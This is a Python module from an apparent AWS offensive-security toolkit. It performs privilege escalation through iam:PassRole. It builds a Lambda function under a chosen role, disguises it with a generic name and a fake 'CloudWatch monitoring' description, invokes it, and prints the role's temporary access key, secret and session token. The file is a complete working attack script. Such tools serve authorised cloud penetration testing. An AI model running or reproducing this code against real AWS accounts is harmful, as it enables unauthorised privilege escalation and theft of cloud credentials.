import boto3
import botocore
import os
import time
import zipfile
from colorama import Fore, Style
from functions import create_client

def help():
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")
    print("[+] Module Description:\n")
    print("\tThis module will create a lambda that will export temporary credentials")
    print("\tfor the role attached to it to the screen.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will ask you for the arn of a role to be")
    print("\tpassed to the new lambda function and the region to create the lambda.")

    print("[+] IMPORTANT:\n")
    print("\tYou need the 'iam:passrole', 'lambda:create_function' and 'lambda:execute' permissions.")
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")

def aws_file():
    with open("lambda_function.zip", 'rb') as file_data:
        bytes_content = file_data.read()

    return bytes_content

def create_lambda(client, function_role):
    response = client.create_function(
        FunctionName="TestLambda",
        Runtime="python3.13",
        Role=function_role,
        Handler="lambda_function.lambda_handler",
        Code={
            "ZipFile": aws_file()
        },
        Description="Lambda de monitoramento de Eventos do CloudWatch.",
        Publish=True,
        PackageType="Zip"
       )

    return response

def create_lambda_file(lambda_path):
    lambda_code = """
import json
import os

def lambda_handler(event, context):
    environment = os.environ.copy()
    secret = environment["AWS_SECRET_ACCESS_KEY"]
    key = environment["AWS_ACCESS_KEY_ID"]
    token = environment["AWS_SESSION_TOKEN"]

    return {
        'statusCode': 200,
        'body': json.dumps({
            'key': key,
            'secret': secret,
            'token': token
        })
    }
"""

    try:
        print('[+] Zipping Lambda function...\n')
        with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('lambda_function.py', lambda_code)
    except Exception as e:
        print('Failed to zip Lambda: {}\n'.format(e))

def check_lambda_status(client, function_name):
    response = client.get_function(
        FunctionName=function_name
    )

    if response['Configuration']['State'] == 'Active':
        return True
    else:
        return False

def invoke_lambda(client, function_name):
    response = client.invoke(
        FunctionName=function_name,
    )

    return response

def main(botoconfig, session):
    results = {}

    print("[+] Starting privilege escalation module...")
    function_role = input("[+] Please input the " + Fore.YELLOW + "role arn" + Style.RESET_ALL + " to be passed to the Lambda function: ")
    region_name = input("[+] Please input the " + Fore.YELLOW + "region" + Style.RESET_ALL + " to be used: ")
    lambda_path = './lambda_function.zip'

    print("[+] Creating Lambda file...")
    create_lambda_file(lambda_path)

    print("[+] Creating Lambda Function...")
    lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
    function_data = create_lambda(lambda_client.create_aws_client(), function_role)
    print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
    results['FunctionName'] = function_data['FunctionName']
    results['FunctionArn'] = function_data['FunctionArn']
    
    print("[+] Checking for lambda status...")
    while True:
        token = check_lambda_status(lambda_client.create_aws_client(), function_data['FunctionName'])
        if token:
            break
        else:
            time.sleep(10)

    os.remove(lambda_path)

    print("[+] Invoking Function...")
    lambda_invoke = invoke_lambda(lambda_client.create_aws_client(), function_data["FunctionName"])
    print(lambda_invoke["Payload"].read().decode('utf-8'))

    return results